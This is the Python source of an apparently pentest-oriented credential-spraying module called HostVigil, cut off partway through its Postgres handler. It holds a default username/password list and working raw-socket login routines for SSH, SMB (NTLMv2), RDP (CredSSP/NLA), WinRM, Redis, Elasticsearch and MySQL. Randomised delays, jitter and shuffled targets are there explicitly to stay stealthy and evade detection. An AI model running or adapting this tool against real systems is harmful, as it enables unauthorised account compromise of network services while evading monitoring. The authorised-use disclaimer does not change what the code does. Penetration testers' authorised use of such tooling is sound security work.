"""
HostVigil Stealth Credential Spraying Module
=============================================

⚠️  AUTHORIZED USE ONLY ⚠️

This module performs slow, stealth credential spraying against discovered
network services. It is designed EXCLUSIVELY for use during authorized
internal security assessments and penetration tests.

UNAUTHORIZED USE OF THIS MODULE AGAINST SYSTEMS YOU DO NOT OWN OR HAVE
EXPLICIT WRITTEN PERMISSION TO TEST IS ILLEGAL under the Computer Fraud
and Abuse Act (CFAA) and equivalent laws worldwide.

Stealth principles:
- Maximum ONE authentication attempt per host per hour
- Randomized delays (30-120s) between all attempts
- No external dependencies — raw sockets only
- Password hashes stored, never plaintext
- All activity logged for audit trail

The operator assumes full legal responsibility for use of this module.
"""

import base64
import hashlib
import logging
import os
import random
import socket
import sqlite3
import struct
import time
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional, Tuple

logger = logging.getLogger("hostvigil.scanner.credential_spray")

# Check MD4 availability (OpenSSL 3.0+ may disable legacy algorithms)
_MD4_AVAILABLE = True
try:
    hashlib.new("md4", b"test")
except (ValueError, TypeError):
    _MD4_AVAILABLE = False

# Default credential pairs for spraying
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("administrator", "password"),
    ("test", "test"),
    ("guest", "guest"),
    ("admin", ""),
    ("sa", "sa"),
    ("postgres", "postgres"),
]

# Service-to-port mapping for target identification
SERVICE_PORTS = {
    22: "ssh",
    445: "smb",
    3389: "rdp",
    5985: "winrm",
    6379: "redis",
    9200: "elasticsearch",
    3306: "mysql",
    5432: "postgres",
}


class StealthCredentialSpray:
    """
    Stealth credential spraying engine.

    Performs slow, distributed credential testing against discovered services.
    Enforces strict rate limiting: ONE attempt per host:port per hour maximum.

    Args:
        config: Dictionary with spray configuration options.
        db_path: Path to the HostVigil SQLite database.
    """

    def __init__(self, config: dict, db_path: str):
        self.db_path = db_path
        self.min_delay = config.get("min_delay", 60.0)
        self.max_delay = config.get("max_delay", 120.0)
        self.max_attempts_per_host_per_hour = 1
        self.timeout = config.get("timeout", 5.0)
        self.jitter_factor = config.get("jitter_factor", 0.3)
        self._ensure_table()

    def _ensure_table(self):
        """Create/migrate credential_results table to expected schema."""
        conn = sqlite3.connect(self.db_path, timeout=30)
        conn.execute("PRAGMA busy_timeout=30000")
        try:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS credential_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    host_id INTEGER NOT NULL,
                    port INTEGER,
                    service TEXT,
                    username TEXT,
                    credential_hash TEXT,
                    success INTEGER DEFAULT 0,
                    tested_at TEXT NOT NULL,
                    FOREIGN KEY (host_id) REFERENCES hosts(id)
                )
            """)

            # Backward compatibility migrations for older local schemas.
            cols = {row[1] for row in conn.execute("PRAGMA table_info(credential_results)").fetchall()}
            if "credential_hash" not in cols:
                conn.execute("ALTER TABLE credential_results ADD COLUMN credential_hash TEXT")
            if "tested_at" not in cols:
                conn.execute("ALTER TABLE credential_results ADD COLUMN tested_at TEXT")
            if "password_hash" in cols:
                conn.execute(
                    "UPDATE credential_results SET credential_hash = password_hash "
                    "WHERE credential_hash IS NULL AND password_hash IS NOT NULL"
                )
            if "attempted_at" in cols:
                conn.execute(
                    "UPDATE credential_results SET tested_at = attempted_at "
                    "WHERE tested_at IS NULL AND attempted_at IS NOT NULL"
                )

            conn.execute("""
                CREATE INDEX IF NOT EXISTS idx_cred_host_port_time
                ON credential_results (host_id, port, tested_at)
            """)
            conn.commit()
        finally:
            conn.close()

    def _get_delay(self) -> float:
        """Calculate randomized stealth delay between attempts."""
        base = random.uniform(self.min_delay, self.max_delay)
        jitter = base * self.jitter_factor * random.uniform(-1, 1)
        return max(30.0, base + jitter)

    def _hash_password(self, password: str) -> str:
        """Hash password with SHA-256 for storage. Never store plaintext."""
        return hashlib.sha256(password.encode("utf-8", errors="replace")).hexdigest()

    def _load_custom_credentials(self) -> List[Tuple]:
        """Load custom credential pairs from the database.

        Returns:
            List of (username, password) tuples from the custom_credentials table.
            Returns an empty list if the table doesn't exist or on any error.
        """
        try:
            conn = sqlite3.connect(self.db_path, timeout=10)
            try:
                rows = conn.execute("SELECT username, password FROM custom_credentials").fetchall()
                return [(r[0], r[1]) for r in rows]
            finally:
                conn.close()
        except Exception:
            return []

    def spray_all(self, creds: Optional[List[Tuple]] = None, progress_callback=None) -> List[Dict]:
        """
        Spray one credential pair against all eligible targets.

        Selects the next credential from the list and attempts it against
        each target that hasn't been attempted within the last hour.

        Args:
            creds: Optional list of (username, password) tuples.
                   Defaults to DEFAULT_CREDS if not provided.
            progress_callback: Optional callable(done, total, results) invoked
                after each target is processed, for live progress reporting.
                Note: 'password' is only present in the in-memory results
                passed to this callback for the duration of this call — it is
                never persisted (the database only ever stores a SHA-256 hash).

        Returns:
            List of result dictionaries with attempt outcomes.
        """
        if creds is None:
            creds = list(DEFAULT_CREDS) + self._load_custom_credentials()

        targets = self._get_eligible_targets()
        if not targets:
            logger.info("No eligible targets for credential spraying (all rate-limited)")
            return []

        results = []
        total = len(targets)
        for done, target in enumerate(targets, start=1):
            host_id = target["host_id"]
            ip = target["ip"]
            port = target["port"]
            service = SERVICE_PORTS.get(port, "unknown")

            # Pick next untried credential for this target
            cred = self._get_next_credential(host_id, port, creds)
            if cred is None:
                logger.debug(f"All credentials exhausted for {ip}:{port}")
                if progress_callback:
                    try:
                        progress_callback(done, total, results)
                    except Exception:
                        pass
                continue

            username, password = cred
            logger.info(f"Spraying {service}://{ip}:{port} with user '{username}'")

            try:
                success = self._attempt_auth(ip, port, service, username, password)
                self._store_result(host_id, port, service, username, password, success)

                result = {
                    "ip": ip,
                    "port": port,
                    "service": service,
                    "username": username,
                    "password": password,
                    "method": "credential-spray",
                    "success": success,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                }
                results.append(result)

                if success:
                    logger.warning(f"[+] VALID CREDS: {service}://{username}@{ip}:{port}")
                else:
                    logger.debug(f"[-] Failed: {service}://{username}@{ip}:{port}")

            except Exception as e:
                logger.debug(f"Error spraying {ip}:{port}: {e}")

            if progress_callback:
                try:
                    progress_callback(done, total, results)
                except Exception:
                    pass

            # Stealth delay between attempts
            delay = self._get_delay()
            logger.debug(f"Sleeping {delay:.1f}s before next attempt")
            time.sleep(delay)

        return results

    def _get_eligible_targets(self) -> List[Dict]:
        """
        Get targets not attempted within the last hour.

        Queries the hosts/ports database for services matching spray-able ports,
        then filters out any that have been attempted within the rate limit window.

        Returns:
            List of target dictionaries with ip, port, host_id.
        """
        conn = sqlite3.connect(self.db_path, timeout=30)
        conn.execute("PRAGMA busy_timeout=30000")
        conn.row_factory = sqlite3.Row
        try:
            # Get all hosts with spray-able ports
            sprayable_ports = list(SERVICE_PORTS.keys())
            placeholders = ",".join("?" * len(sprayable_ports))

            cursor = conn.execute(
                f"""
                SELECT DISTINCT h.id as host_id, h.ip, p.port
                FROM hosts h
                JOIN ports p ON h.id = p.host_id
                WHERE p.port IN ({placeholders})
                AND p.state = 'open'
            """,
                sprayable_ports,
            )

            all_targets = [dict(row) for row in cursor.fetchall()]

            # Filter out rate-limited targets
            one_hour_ago = (datetime.now(timezone.utc) - timedelta(hours=1)).isoformat()

            eligible = []
            for target in all_targets:
                count = conn.execute(
                    """
                    SELECT COUNT(*) FROM credential_results
                    WHERE host_id = ? AND port = ? AND tested_at > ?
                """,
                    (target["host_id"], target["port"], one_hour_ago),
                ).fetchone()[0]

                if count < self.max_attempts_per_host_per_hour:
                    eligible.append(target)

            # Randomize order to avoid sequential patterns
            random.shuffle(eligible)
            return eligible

        finally:
            conn.close()

    def _get_next_credential(self, host_id: int, port: int, creds: List[Tuple]) -> Optional[Tuple]:
        """
        Get the next untried credential for a target.

        Checks which credentials have already been attempted and returns
        the next one in the list that hasn't been tried yet.
        """
        conn = sqlite3.connect(self.db_path, timeout=30)
        conn.execute("PRAGMA busy_timeout=30000")
        try:
            cursor = conn.execute(
                """
                SELECT username, credential_hash FROM credential_results
                WHERE host_id = ? AND port = ?
            """,
                (host_id, port),
            )

            attempted = set()
            for row in cursor.fetchall():
                attempted.add((row[0], row[1]))

            for username, password in creds:
                pw_hash = self._hash_password(password)
                if (username, pw_hash) not in attempted:
                    return (username, password)

            return None
        finally:
            conn.close()

    def _attempt_auth(self, ip: str, port: int, service: str, username: str, password: str) -> bool:
        """Route authentication attempt to the appropriate protocol handler."""
        handlers = {
            "ssh": self._spray_ssh,
            "smb": self._spray_smb,
            "rdp": self._spray_rdp,
            "winrm": self._spray_winrm,
            "redis": self._spray_redis,
            "elasticsearch": self._spray_http_basic,
            "mysql": self._spray_mysql,
            "postgres": self._spray_postgres,
        }
        handler = handlers.get(service)
        if handler is None:
            logger.debug(f"No handler for service: {service}")
            return False
        return handler(ip, port, username, password)

    # ─── Protocol Handlers ────────────────────────────────────────────────

    def _spray_ssh(self, ip: str, port: int, username: str, password: str) -> bool:
        """
        Attempt SSH password authentication using paramiko.

        Uses paramiko's Transport for a proper SSH-2 key exchange and
        password authentication. Returns True only if auth succeeds.
        """
        try:
            import paramiko

            transport = paramiko.Transport((ip, port))
            transport.connect(username=username, password=password)
            transport.close()
            return True

        except paramiko.AuthenticationException:
            # Wrong credentials — expected case
            return False
        except paramiko.SSHException as e:
            logger.debug("SSH protocol error on %s:%d: %s", ip, port, e)
            return False
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            logger.debug("SSH connection failed to %s:%d: %s", ip, port, e)
            return False
        except Exception as e:
            logger.debug("SSH unexpected error on %s:%d: %s", ip, port, e)
            return False

    def _spray_smb(self, ip: str, port: int, username: str, password: str) -> bool:
        """
        Attempt SMB authentication using NTLMv2 over raw socket.

        Uses proper NTLMv2 cryptography (HMAC-MD5). Works against modern
        Windows systems that require NTLMv2 (LmCompatibilityLevel >= 3).
        """
        import hmac as _hmac

        if not _MD4_AVAILABLE:
            logger.debug("MD4 unavailable, skipping SMB for %s", ip)
            return False

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.settimeout(self.timeout)
            sock.connect((ip, port))

            # --- SMB1 Negotiate ---
            smb_header = b"\xffSMB\x72" + b"\x00" * 4 + b"\x18\x53\xc8"
            smb_header += b"\x00" * 12 + b"\x00\x00"
            smb_header += struct.pack("<H", os.getpid() & 0xFFFF)
            smb_header += b"\x00\x00\x00\x00"

            dialects = b"\x02NT LM 0.12\x00"
            neg_payload = b"\x00" + struct.pack("<H", len(dialects)) + dialects
            smb_pkt = smb_header + neg_payload
            sock.sendall(b"\x00" + struct.pack(">I", len(smb_pkt))[1:] + smb_pkt)

            resp = sock.recv(4096)
            if len(resp) < 40 or b"\xffSMB" not in resp:
                return False

            # --- Session Setup: NTLMSSP Type 1 ---
            type1 = b"NTLMSSP\x00" + struct.pack("<I", 1)
            type1 += struct.pack("<I", 0xE2088297)
            type1 += struct.pack("<HHI", 0, 0, 0) * 2

            sess1 = self._smb_session_setup_packet(type1, mid=1)
            sock.sendall(sess1)

            resp2 = sock.recv(4096)
            if b"NTLMSSP" not in resp2:
                return False

            # --- Parse Type 2 Challenge ---
            off = resp2.index(b"NTLMSSP\x00")
            chal_msg = resp2[off:]
            if len(chal_msg) < 32:
                return False

            server_challenge = chal_msg[24:32]

            # Extract target_info from Type 2
            target_info = b""
            if len(chal_msg) >= 48:
                ti_len = struct.unpack_from("<H", chal_msg, 40)[0]
                ti_off = struct.unpack_from("<I", chal_msg, 44)[0]
                if ti_off + ti_len <= len(chal_msg):
                    target_info = chal_msg[ti_off : ti_off + ti_len]

            # --- Compute NTLMv2 Response ---
            nt_hash = hashlib.new("md4", password.encode("utf-16-le")).digest()
            user_target = (username.upper() + "").encode("utf-16-le")
            resp_key = _hmac.new(nt_hash, user_target, hashlib.md5).digest()

            # Client blob
            client_challenge = os.urandom(8)
            filetime = struct.pack("<Q", int(time.time()) * 10000000 + 116444736000000000)
            blob = b"\x01\x01" + b"\x00" * 6 + filetime + client_challenge
            blob += b"\x00" * 4 + target_info + b"\x00" * 4

            nt_proof = _hmac.new(resp_key, server_challenge + blob, hashlib.md5).digest()
            nt_response = nt_proof + blob

            # --- Build Type 3 ---
            uname_bytes = username.encode("utf-16-le")
            domain_bytes = b""
            ws_bytes = b"W\x00K\x00S\x00"
            lm_resp = b"\x00" * 24

            base = 88
            d_off = base
            u_off = d_off + len(domain_bytes)
            w_off = u_off + len(uname_bytes)
            lm_off = w_off + len(ws_bytes)
            nt_off = lm_off + len(lm_resp)

            type3 = b"NTLMSSP\x00" + struct.pack("<I", 3)
            type3 += struct.pack("<HHI", len(lm_resp), len(lm_resp), lm_off)
            type3 += struct.pack("<HHI", len(nt_response), len(nt_response), nt_off)
            type3 += struct.pack("<HHI", len(domain_bytes), len(domain_bytes), d_off)
            type3 += struct.pack("<HHI", len(uname_bytes), len(uname_bytes), u_off)
            type3 += struct.pack("<HHI", len(ws_bytes), len(ws_bytes), w_off)
            type3 += struct.pack("<HHI", 0, 0, 0)
            type3 += struct.pack("<I", 0xE2088297)
            type3 += domain_bytes + uname_bytes + ws_bytes + lm_resp + nt_response

            sess3 = self._smb_session_setup_packet(type3, mid=2)
            sock.sendall(sess3)

            resp3 = sock.recv(4096)
            if len(resp3) < 12:
                return False

            smb_off = resp3.find(b"\xffSMB")
            if smb_off >= 0:
                status = struct.unpack_from("<I", resp3, smb_off + 5)[0]
                return status == 0x00000000

            return False

        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            logger.debug("SMB connection failed to %s:%d: %s", ip, port, e)
            return False
        except Exception as e:
            logger.debug("SMB auth error on %s:%d: %s", ip, port, e)
            return False
        finally:
            try:
                sock.close()
            except OSError:
                pass

    def _smb_session_setup_packet(self, security_blob: bytes, mid: int = 1) -> bytes:
        """Build a NetBIOS-wrapped SMB1 Session Setup AndX packet."""
        hdr = b"\xffSMB\x73" + b"\x00" * 4 + b"\x18\x53\xc8"
        hdr += b"\x00" * 12 + b"\x00\x00"
        hdr += struct.pack("<H", os.getpid() & 0xFFFF)
        hdr += b"\x00\x00" + struct.pack("<H", mid)

        words = b"\x0c\xff\x00\x00\x00"
        words += struct.pack("<H", 65535)
        words += struct.pack("<H", 2)
        words += struct.pack("<H", 1)
        words += struct.pack("<I", 0)
        words += struct.pack("<H", len(security_blob))
        words += struct.pack("<I", 0)
        words += struct.pack("<I", 0x80000000)

        body = struct.pack("<H", len(security_blob)) + security_blob
        pkt = hdr + words + body
        return b"\x00" + struct.pack(">I", len(pkt))[1:] + pkt

    def _spray_rdp(self, ip: str, port: int, username: str, password: str) -> bool:
        """
        Attempt RDP credential verification via NLA (CredSSP/TLS + NTLM).

        Negotiates NLA, wraps connection in TLS, then sends an NTLM Type 1/3
        through the CredSSP TSRequest to get an auth pass/fail from the server.
        """
        import hmac as _hmac
        import ssl

        if not _MD4_AVAILABLE:
            logger.debug("MD4 unavailable, skipping RDP NLA for %s", ip)
            return False

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.settimeout(self.timeout)
            sock.connect((ip, port))

            # X.224 Connection Request with NLA negotiation
            cookie = f"Cookie: mstshash={username}\r\n".encode()
            x224_payload = b"\xe0\x00\x00\x00\x00\x00"
            rdp_neg = b"\x01\x00" + struct.pack("<H", 8) + struct.pack("<I", 0x03)
            x224_data = x224_payload + cookie + rdp_neg
            x224_pkt = struct.pack("B", len(x224_data)) + x224_data
            tpkt = struct.pack(">BBH", 3, 0, 4 + len(x224_pkt)) + x224_pkt
            sock.sendall(tpkt)

            resp = sock.recv(4096)
            if len(resp) < 12 or b"\xd0" not in resp[:20]:
                # Server didn't accept NLA
                return False

            # Check if server accepted CredSSP (protocol 0x03 or 0x02 in response)
            # Response should contain TYPE_RDP_NEG_RSP (0x02)
            neg_rsp_found = False
            for i in range(7, min(len(resp), 20)):
                if resp[i : i + 1] == b"\x02":
                    neg_rsp_found = True
                    break
            if not neg_rsp_found:
                return False

            # Wrap in TLS (CredSSP starts with TLS handshake)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            tls_sock = ctx.wrap_socket(sock, server_hostname=ip)

            # Build NTLM Type 1 inside CredSSP TSRequest
            type1 = b"NTLMSSP\x00" + struct.pack("<I", 1)
            type1 += struct.pack("<I", 0xE2088297)
            type1 += struct.pack("<HHI", 0, 0, 0) * 2

            # TSRequest version 3 with negoToken containing Type 1
            ts_request = self._build_ts_request(type1)
            tls_sock.sendall(ts_request)

            # Receive TSRequest with Type 2 challenge
            ts_resp = tls_sock.recv(8192)
            ntlm_token = self._extract_nego_token(ts_resp)
            if not ntlm_token or b"NTLMSSP" not in ntlm_token:
                return False

            # Parse Type 2
            chal_off = ntlm_token.index(b"NTLMSSP\x00")
            chal_msg = ntlm_token[chal_off:]
            if len(chal_msg) < 32:
                return False

            server_challenge = chal_msg[24:32]
            target_info = b""
            if len(chal_msg) >= 48:
                ti_len = struct.unpack_from("<H", chal_msg, 40)[0]
                ti_off = struct.unpack_from("<I", chal_msg, 44)[0]
                if ti_off + ti_len <= len(chal_msg):
                    target_info = chal_msg[ti_off : ti_off + ti_len]

            # Compute NTLMv2 response
            nt_hash = hashlib.new("md4", password.encode("utf-16-le")).digest()
            resp_key = _hmac.new(nt_hash, (username.upper() + "").encode("utf-16-le"), hashlib.md5).digest()
            client_challenge = os.urandom(8)
            filetime = struct.pack("<Q", int(time.time()) * 10000000 + 116444736000000000)
            blob = b"\x01\x01" + b"\x00" * 6 + filetime + client_challenge + b"\x00" * 4 + target_info + b"\x00" * 4
            nt_proof = _hmac.new(resp_key, server_challenge + blob, hashlib.md5).digest()
            nt_response = nt_proof + blob

            # Build Type 3
            uname_bytes = username.encode("utf-16-le")
            domain_bytes = b""
            ws_bytes = b"W\x00K\x00S\x00"
            lm_resp = b"\x00" * 24
            base = 88
            d_off = base
            u_off = d_off + len(domain_bytes)
            w_off = u_off + len(uname_bytes)
            lm_off = w_off + len(ws_bytes)
            nt_off = lm_off + len(lm_resp)

            type3 = b"NTLMSSP\x00" + struct.pack("<I", 3)
            type3 += struct.pack("<HHI", len(lm_resp), len(lm_resp), lm_off)
            type3 += struct.pack("<HHI", len(nt_response), len(nt_response), nt_off)
            type3 += struct.pack("<HHI", len(domain_bytes), len(domain_bytes), d_off)
            type3 += struct.pack("<HHI", len(uname_bytes), len(uname_bytes), u_off)
            type3 += struct.pack("<HHI", len(ws_bytes), len(ws_bytes), w_off)
            type3 += struct.pack("<HHI", 0, 0, 0)
            type3 += struct.pack("<I", 0xE2088297)
            type3 += domain_bytes + uname_bytes + ws_bytes + lm_resp + nt_response

            # Send Type 3 in TSRequest
            ts_auth = self._build_ts_request(type3)
            tls_sock.sendall(ts_auth)

            # Check server response
            try:
                final_resp = tls_sock.recv(4096)
                # If we get a TSRequest with pubKeyAuth, auth succeeded
                if final_resp and len(final_resp) > 5:
                    # Non-error response = success (server sends pubkey confirmation)
                    # Error would be a TSRequest with errorCode field
                    if b"\x03" in final_resp[:10]:  # TSRequest version present
                        # Check if it contains an error code (tag [3])
                        if b"\xa3" in final_resp:
                            return False  # Auth error
                        return True  # Auth success (pubKeyAuth present)
                return False
            except (ssl.SSLError, OSError):
                # Connection reset = auth failed (server drops on bad creds)
                return False

        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            logger.debug("RDP connection failed to %s:%d: %s", ip, port, e)
            return False
        except (ssl.SSLError, Exception) as e:
            logger.debug("RDP NLA error on %s:%d: %s", ip, port, e)
            return False
        finally:
            try:
                tls_sock.close()
            except (OSError, NameError, UnboundLocalError):
                pass
            try:
                sock.close()
            except OSError:
                pass

    @staticmethod
    def _build_ts_request(ntlm_token: bytes) -> bytes:
        """Build a minimal CredSSP TSRequest containing an NTLM token.

        ASN.1 DER structure:
        TSRequest ::= SEQUENCE {
            version    [0] INTEGER,
            negoTokens [1] SEQUENCE OF SEQUENCE { negoToken [0] OCTET STRING }
        }
        """

        def _der_len(length: int) -> bytes:
            if length < 0x80:
                return struct.pack("B", length)
            elif length < 0x100:
                return b"\x81" + struct.pack("B", length)
            else:
                return b"\x82" + struct.pack(">H", length)

        # negoToken OCTET STRING
        token_body = b"\x04" + _der_len(len(ntlm_token)) + ntlm_token
        # Wrap in context [0]
        inner_seq_body = b"\xa0" + _der_len(len(token_body)) + token_body
        # Inner SEQUENCE
        inner_seq = b"\x30" + _der_len(len(inner_seq_body)) + inner_seq_body
        # SEQUENCE OF
        seq_of = b"\x30" + _der_len(len(inner_seq)) + inner_seq
        # negoTokens [1]
        nego_tokens = b"\xa1" + _der_len(len(seq_of)) + seq_of
        # version [0] INTEGER 3
        version = b"\xa0\x03\x02\x01\x03"
        # TSRequest SEQUENCE
        ts_body = version + nego_tokens
        return b"\x30" + _der_len(len(ts_body)) + ts_body

    @staticmethod
    def _extract_nego_token(ts_data: bytes) -> Optional[bytes]:
        """Extract the NTLM token from a CredSSP TSRequest response."""
        # Simple extraction: find NTLMSSP signature in the ASN.1 blob
        if b"NTLMSSP\x00" in ts_data:
            off = ts_data.index(b"NTLMSSP\x00")
            return ts_data[off:]
        return None

    def _spray_winrm(self, ip: str, port: int, username: str, password: str) -> bool:
        """
        Attempt WinRM authentication via HTTP Basic over raw socket.

        WinRM on port 5985 (HTTP) accepts Basic auth when configured.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.settimeout(self.timeout)
            sock.connect((ip, port))

            # Build HTTP Basic auth header
            creds_b64 = base64.b64encode(f"{username}:{password}".encode()).decode()

            http_request = (
                f"POST /wsman HTTP/1.1\r\n"
                f"Host: {ip}:{port}\r\n"
                f"Authorization: Basic {creds_b64}\r\n"
                f"Content-Type: application/soap+xml;charset=UTF-8\r\n"
                f"Content-Length: 0\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            )

            sock.sendall(http_request.encode())
            response = sock.recv(4096)

            response_str = response.decode("utf-8", errors="replace")

            # 200 or 401 with specific headers indicate auth result
            if "HTTP/1.1 200" in response_str:
                return True
            if "HTTP/1.1 401" in response_str:
                return False

            return False

        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            logger.debug(f"WinRM connection failed to {ip}:{port}: {e}")
            return False
        finally:
            try:
                sock.close()
            except OSError:
                pass

    def _spray_redis(self, ip: str, port: int, username: str, password: str) -> bool:
        """
        Attempt Redis AUTH command over raw socket.

        Redis uses a simple text protocol. AUTH <password> returns +OK or -ERR.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.settimeout(self.timeout)
            sock.connect((ip, port))

            # Redis RESP protocol AUTH command
            if username and username != "admin":
                # Redis 6+ ACL: AUTH username password
                cmd = f"*3\r\n$4\r\nAUTH\r\n${len(username)}\r\n{username}\r\n${len(password)}\r\n{password}\r\n"
            else:
                # Redis < 6: AUTH password
                cmd = f"*2\r\n$4\r\nAUTH\r\n${len(password)}\r\n{password}\r\n"

            sock.sendall(cmd.encode())
            response = sock.recv(1024)

            response_str = response.decode("utf-8", errors="replace")

            # +OK means authentication successful
            if response_str.startswith("+OK"):
                return True

            # -NOAUTH means no password required (already authenticated)
            if "-NOAUTH" in response_str or "-ERR Client sent AUTH" in response_str:
                # Server doesn't require auth — that's a finding itself
                # but not a credential spray success
                logger.info("Redis at %s:%d requires no authentication", ip, port)
                return False

            return False

        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            logger.debug(f"Redis connection failed to {ip}:{port}: {e}")
            return False
        finally:
            try:
                sock.close()
            except OSError:
                pass

    def _spray_http_basic(self, ip: str, port: int, username: str, password: str) -> bool:
        """
        Attempt HTTP Basic authentication (Elasticsearch, Kibana, etc).

        Sends a GET request to the root endpoint with Basic auth header.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.settimeout(self.timeout)
            sock.connect((ip, port))

            creds_b64 = base64.b64encode(f"{username}:{password}".encode()).decode()

            http_request = (
                f"GET / HTTP/1.1\r\nHost: {ip}:{port}\r\nAuthorization: Basic {creds_b64}\r\nConnection: close\r\n\r\n"
            )

            sock.sendall(http_request.encode())
            response = sock.recv(4096)

            response_str = response.decode("utf-8", errors="replace")

            if "HTTP/1.1 200" in response_str or "HTTP/1.0 200" in response_str:
                return True
            if "401" in response_str:
                return False

            # Elasticsearch returns 200 with JSON body on success
            if '"cluster_name"' in response_str:
                return True

            return False

        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            logger.debug(f"HTTP Basic auth failed to {ip}:{port}: {e}")
            return False
        finally:
            try:
                sock.close()
            except OSError:
                pass

    def _spray_mysql(self, ip: str, port: int, username: str, password: str) -> bool:
        """
        Attempt MySQL native password authentication over raw socket.

        Implements the MySQL protocol handshake and auth response.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.settimeout(self.timeout)
            sock.connect((ip, port))

            # Receive server greeting
            greeting_raw = sock.recv(4096)
            if len(greeting_raw) < 10:
                return False

            # Parse MySQL greeting packet
            # First 4 bytes: packet length (3) + sequence (1)
            pkt_len = struct.unpack_from("<I", greeting_raw[:3] + b"\x00", 0)[0]
            seq = greeting_raw[3]

            payload = greeting_raw[4 : 4 + pkt_len]
            if len(payload) < 5:
                return False

            # Protocol version
            protocol = payload[0]
            if protocol == 0xFF:
                # Error packet
                return False

            # Server version (null-terminated string)
            null_pos = payload.index(b"\x00", 1)

            # Connection ID (4 bytes) — value unused, just advance past it
            offset = null_pos + 1
            offset += 4

            # Auth plugin data part 1 (8 bytes) + filler
            salt_part1 = payload[offset : offset + 8]
            offset += 8 + 1  # +1 for filler byte

            # Server capabilities (2 bytes) — value unused, just advance past it
            offset += 2

            # Character set, status flags, extended capabilities
            if len(payload) > offset + 5:
                offset += 1 + 2 + 2  # charset + status + ext_capabilities
                # Auth plugin data length
                offset += 1
                # Reserved (10 bytes)
                offset += 10

                # Auth plugin data part 2
                salt_part2 = payload[offset : offset + 12]
                salt = salt_part1 + salt_part2
            else:
                salt = salt_part1

            # Build auth response using mysql_native_password
            if password:
                # SHA1(password)
                password_sha1 = hashlib.sha1(password.encode("utf-8")).digest()
                # SHA1(SHA1(password))
                double_sha1 = hashlib.sha1(password_sha1).digest()
                # SHA1(salt + SHA1(SHA1(password)))
                salt_hash = hashlib.sha1(salt + double_sha1).digest()
                # XOR SHA1(password) with salt_hash
                auth_response = bytes(a ^ b for a, b in zip(password_sha1, salt_hash))
            else:
                auth_response = b""

            # Build Handshake Response packet
            # Client capabilities
            client_caps = 0x0003A685  # Standard MySQL client flags
            max_packet = 0x01000000  # 16MB
            charset = 0x21  # utf8_general_ci

            auth_packet = struct.pack("<I", client_caps)
            auth_packet += struct.pack("<I", max_packet)
            auth_packet += struct.pack("B", charset)
            auth_packet += b"\x00" * 23  # Reserved
            auth_packet += username.encode("utf-8") + b"\x00"
            auth_packet += struct.pack("B", len(auth_response))
            auth_packet += auth_response
            auth_packet += b"mysql_native_password\x00"

            # Packet header: length (3 bytes LE) + sequence number
            pkt_header = struct.pack("<I", len(auth_packet))[:3]
            pkt_header += struct.pack("B", seq + 1)

            sock.sendall(pkt_header + auth_packet)

            # Receive auth response
            auth_resp = sock.recv(4096)

            if len(auth_resp) < 5:
                return False

            # Check response type (byte at offset 4)
            resp_type = auth_resp[4]

            # 0x00 = OK packet (auth success)
            if resp_type == 0x00:
                return True
            # 0xff = ERR packet (auth failure)
            if resp_type == 0xFF:
                return False
            # 0xfe = auth switch request (MySQL 8.0+)
            if resp_type == 0xFE:
                # Parse auth switch: plugin name (null-terminated) + new salt
                switch_payload = auth_resp[5:]
                null_idx = switch_payload.index(b"\x00") if b"\x00" in switch_payload else len(switch_payload)
                plugin_name = switch_payload[:null_idx].decode("utf-8", errors="replace")
                new_salt = switch_payload[null_idx + 1 :].rstrip(b"\x00")

                if plugin_name == "mysql_native_password":
                    # Re-auth with new salt using mysql_native_password
                    if password:
                        pw_sha1 = hashlib.sha1(password.encode("utf-8")).digest()
                        dbl_sha1 = hashlib.sha1(pw_sha1).digest()
                        salt_hash = hashlib.sha1(new_salt + dbl_sha1).digest()
                        switch_resp = bytes(a ^ b for a, b in zip(pw_sha1, salt_hash))
                    else:
                        switch_resp = b""
                elif plugin_name == "caching_sha2_password":
                    # caching_sha2_password: SHA256(password) XOR SHA256(SHA256(SHA256(password)) + salt)
                    if password:
                        pw_bytes = password.encode("utf-8")
                        sha256_pw = hashlib.sha256(pw_bytes).digest()
                        sha256_sha256_pw = hashlib.sha256(sha256_pw).digest()
                        combined = hashlib.sha256(sha256_sha256_pw + new_salt).digest()
                        switch_resp = bytes(a ^ b for a, b in zip(sha256_pw, combined))
                    else:
                        switch_resp = b""
                else:
                    # Unknown plugin, can't continue
                    return False

                # Send auth switch response
                switch_pkt = struct.pack("<I", len(switch_resp))[:3]
                switch_pkt += struct.pack("B", (auth_resp[3] + 1) & 0xFF if len(auth_resp) >= 4 else 3)
                switch_pkt += switch_resp
                sock.sendall(switch_pkt)

                # Read final response
                final_resp = sock.recv(4096)
                if len(final_resp) >= 5:
                    final_type = final_resp[4]
                    if final_type == 0x00:
                        return True
                    # 0x01 = more data needed (fast auth success for caching_sha2)
                    if final_type == 0x01 and len(final_resp) > 5:
                        if final_resp[5] == 0x03:  # fast_auth_success
                            # Read the actual OK packet
                            ok_resp = sock.recv(4096)
                            return len(ok_resp) >= 5 and ok_resp[4] == 0x00
                return False

            return False

        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            logger.debug(f"MySQL connection failed to {ip}:{port}: {e}")
            return False
        finally:
            try:
                sock.close()
            except OSError:
                pass

    def _spray_postgres(self, ip: str, port: int, username: str, password: str) -> bool:
        """
